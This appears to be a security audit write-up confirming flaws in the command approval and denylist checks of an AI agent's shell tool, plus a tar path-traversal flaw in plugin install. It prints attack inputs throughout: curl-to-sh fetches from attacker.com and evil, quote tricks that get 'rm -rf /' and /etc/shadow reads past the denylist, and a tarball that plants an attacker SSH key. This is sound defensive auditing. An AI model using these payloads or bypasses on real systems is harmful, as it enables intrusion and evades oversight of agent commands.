# Round 3 Hypotheses — Causal Verifier (Counterfactual / Intervention Tests)

## PH-C01: Causal Confirmation — Shell Metachar Bypass via `;` After Approved Prefix

**Reasoning model**: Causal (counterfactual)
**Derives from**: CROSS-01, PH-01
**Status**: VALIDATED

Counterfactual test: Would inserting a real shell parser (e.g., `mvdan.cc/sh`) that rejects `;` outside quotes prevent the attack?

YES — the vulnerability is CAUSED BY the absence of shell-syntax-aware tokenization in `extractBashPrefix`. The function uses `strings.Split(command, "|")` as its only separator detection. If this were replaced with a proper AST-based check that rejects any command containing `;`, `&&`, `||`, `$(`, backticks, `>`, `>>`, `<`, brace expansion at the top level, the attack would be prevented.

Intervention test: Code path trace for `cat tools/file.go ; id > /tmp/causal_test`:
1. `x/cmd/run.go:378` — `agent.IsDenied("cat tools/file.go ; id > /tmp/causal_test")` 
   - denyPatterns: `> /dev/` matches `>/dev/` not `> /tmp`; none of the others match
   - Returns `false, ""` — NOT blocked
2. `approval.go:204` — `extractBashPrefix("cat tools/file.go ; id > /tmp/causal_test")`
   - `strings.Split(command, "|")` → first part: `"cat tools/file.go ; id > /tmp/causal_test"` (no pipe)
   - `fields = ["cat", "tools/file.go", ";", "id", ">", "/tmp/causal_test"]`
   - `baseCmd = "cat"` — in safeCommands map ✓
   - First non-flag arg: `"tools/file.go"` — contains `/`, not `..`, not absolute
   - `path.Clean("tools/file.go")` → `"tools/file.go"`, no `..` in original
   - `dir = path.Dir("tools/file.go")` → `"tools"`
   - Returns `"cat:tools/"` ✓
3. `approval.go:404` — if `"cat:tools/"` is in prefixes → `IsAllowed` returns `true`
4. `bash.go:64` — `exec.CommandContext(ctx, "bash", "-c", "cat tools/file.go ; id > /tmp/causal_test")`
   - Bash executes BOTH commands. `/tmp/causal_test` written.

Causal chain is confirmed end-to-end. The absence of shell-syntax parsing in extractBashPrefix is the DIRECT CAUSE.

**Attack input**: `cat tools/file.go ; id > /tmp/causal_test` (after `cat:tools/` is in prefixes)
**Code path**: `run.go:378` (IsDenied→false) → `run.go:404` (IsAllowed→true via prefix) → `bash.go:64` (executes both commands)
**Sanitizers**: IsDenied (bypassed — no denylist match); extractBashPrefix (bypassed — semicolon not a separator)
**Consequence**: Arbitrary code execution; token `; id > /tmp/causal_test` proves code injection; replace with reverse shell payload for full RCE
**Severity**: CRITICAL

---

## PH-C02: Causal Confirmation — Command Substitution in Path Arg

**Reasoning model**: Causal (intervention)
**Derives from**: CROSS-02, PH-08
**Status**: VALIDATED

Intervention: if `extractBashPrefix` were to call `strings.ContainsAny(arg, "$`{}")` and return `""` for any arg containing these characters, the attack would be prevented.

Code path trace for `cat tools/$(id)`:
1. `IsDenied("cat tools/$(id)")` → no denylist match → false
2. `extractBashPrefix("cat tools/$(id)")`:
   - No `|` → whole command is first part
   - `fields = ["cat", "tools/$(id)"]`
   - `baseCmd = "cat"` ✓
   - arg = `"tools/$(id)"` — contains `/` → proceeds
   - `path.IsAbs("tools/$(id)")` → false
   - `path.Clean("tools/$(id)")` → `"tools/$(id)"` (no `..`)
   - No `..` in original → sibling check skipped
   - `dir = path.Dir("tools/$(id)")` → `"tools"` (Go path.Dir splits on last `/`)
   - Wait: `path.Dir("tools/$(id)")` → since `$(id)` has no `/`, dir is `"tools"`
   - Returns `"cat:tools/"` ✓ — APPROVED if `cat:tools/` is in prefixes
3. `bash.go:64` executes: `bash -c "cat tools/$(id)"` → bash evaluates `$(id)`, uses result as filename. Subshell executes.

CONFIRMED. The `$()` construct is treated as a normal path character by Go's `path.Dir`.

**Attack input**: `cat tools/$(curl -s http://attacker.com/cmd | sh)`
**Code path**: same as PH-C01 but via command substitution in path position
**Consequence**: CRITICAL — arbitrary shell code execution hidden inside what appears to be a legitimate file read

---

## PH-C03: Causal Confirmation — ZipSlip via tar Without Go-Level Containment

**Reasoning model**: Causal (intervention)
**Derives from**: CROSS-03, PH-05
**Status**: VALIDATED

Counterfactual: Would using `archive/tar` in Go with per-entry path validation prevent the attack?

YES — `exec.Command("tar", ...)` delegates all security decisions to the system tar binary. Different tar versions have different behavior for `../` entries. GNU tar 1.28+ adds `--no-overwrite-dir` but does not reject `../` by default without `--no-same-owner` etc. The Go `archive/tar` library + manual path checking would allow per-entry `filepath.IsLocal(entry.Name)` gating.

The current code at `openclaw.go:782`:
```go
tar := exec.Command("tar", "xzf", tgzPath, "--strip-components=1", "-C", pluginDir)
```

`--strip-components=1` removes the first path component. A tarball entry `package/../../../.ssh/authorized_keys` after stripping component 1 becomes `../../.ssh/authorized_keys`, which tar then resolves relative to `-C pluginDir`. Standard GNU tar extracts this to `$HOME/.ssh/authorized_keys`.

Causal test (without a real npm package): create a test tarball:
```bash
mkdir -p /tmp/probe_pkg/package
echo "ssh-rsa ATTACKER_KEY" > /tmp/probe_pkg/evil_key
cd /tmp/probe_pkg
tar czf test.tgz --transform 's,^evil_key,package/../../../.ssh/authorized_keys_probe,' evil_key
```
Then run:
```
tar xzf test.tgz --strip-components=1 -C /tmp/testplugin
```
Predicted: creates `/tmp/testplugin/../../../.ssh/authorized_keys_probe` → `~/.ssh/authorized_keys_probe`.

The CAUSE is the use of system `tar` with no Go-level path filtering.

**Attack input**: Malicious npm tarball with `../` path entries (supply chain attack on `@ollama/openclaw-web-search`)
**Code path**: `openclaw.go:771` → `npm pack` → `:779` (tgzName) → `:782` (`tar xzf`) → filesystem write outside pluginDir
**Consequence**: Arbitrary file write as current user. Can write `~/.ssh/authorized_keys` (persistent SSH access), `~/.bashrc`/`~/.zprofile` (persistent code execution on shell login)
**Severity**: CRITICAL

---

## PH-C04: Causal Confirmation — Denylist Quoting Bypass

**Reasoning model**: Causal
**Derives from**: PH-02, CROSS-04
**Status**: VALIDATED

Intervention: if `IsDenied` evaluated the denylist after bash-quote normalization (i.e., ran `bash -n` or a POSIX-quoting parser to extract the literal command), the attack would be prevented.

Current code at approval.go:179-188:
```go
commandLower := strings.ToLower(command)
for _, pattern := range denyPatterns {
    if strings.Contains(commandLower, strings.ToLower(pattern)) {
        return true, pattern
    }
}
```

This is purely a string-contains check on the RAW command string. Bash quote processing happens AFTER this check, inside the bash subprocess. Therefore:

- `r''m -rf /` → `commandLower` = `r''m -rf /`, pattern `rm -rf` → `strings.Contains("r''m -rf /", "rm -rf")` → FALSE (the two characters `''` break the match) → NOT DENIED
- `sudo true` → `commandLower` contains `sudo ` → DENIED ✓ (this one works)
- `su''do cat /etc/shadow` → `strings.Contains("su''do cat /etc/shadow", "sudo ")` → FALSE → NOT DENIED; but `strings.Contains(..., "/etc/shadow")` → TRUE → DENIED (shadow check still fires)
- `cat /etc/sh''adow` → `strings.Contains(..., "/etc/shadow")` → FALSE → NOT DENIED

The quoting bypass is causally confirmed. The fix requires either (a) not relying on denylist security, or (b) shell-quote-aware normalization before the contains check.

**Severity**: HIGH (denylist is not a reliable security boundary)

---

## PH-C05: Causal Confirmation — $VISUAL/$EDITOR Flag Injection via strings.Fields

**Reasoning model**: Causal
**Derives from**: PH-06
**Status**: VALIDATED

`cmd/interactive.go:675-677`:
```go
args := strings.Fields(editor)
args = append(args, tmpFile.Name())
cmd := exec.Command(args[0], args[1:]...)
```

`strings.Fields` splits on whitespace. If `VISUAL="bash -c 'curl http://evil|sh' #"`:
- `args = ["bash", "-c", "curl http://evil|sh", "#"]`  
- `exec.Command("bash", "-c", "curl http://evil|sh", "#", tmpFile.Name())`
- bash interprets: `-c "curl http://evil|sh"` with `"#"` and `tmpFile.Name()` as `$0` and `$1` (unused when `-c` is specified)
- `curl http://evil` is fetched, piped to `sh`

Counterfactual: if `exec.LookPath(editor)` were used (the full editor string, not just `fields[0]`), then a space-containing value like `bash -c ...` would fail the LookPath check (binary `"bash -c ..."` does not exist). However the code does `exec.LookPath(name)` where `name = strings.Fields(editor)[0]` = `"bash"`, which EXISTS. So the LookPath check is causally ineffective as a guard against flag injection.

**Attack input**: `VISUAL="bash -c 'id>/tmp/probe' #"` → user presses Ctrl+G
**Code path**: `interactive.go:644-677`
**Consequence**: Arbitrary binary execution as ollama user; requires env-level access
**Severity**: HIGH
